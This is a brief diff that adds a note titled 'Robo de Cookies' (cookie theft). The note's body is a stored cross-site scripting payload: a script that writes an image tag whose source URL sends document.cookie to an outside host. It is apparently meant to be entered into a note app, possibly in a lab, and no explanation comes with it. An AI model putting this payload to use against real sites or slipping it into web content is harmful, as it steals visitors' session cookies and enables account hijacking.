@@ -1,0 +1,7 @@
+CREATE NEW NOTE 
+
+  Tittle:
+    Robo de Cookies
+
+  Note: 
+    :::  <script>document.write('<img src="http://miIpPanda8hat/archivoGoro.jpg?cookie=' + document.cookie + '">')</script>
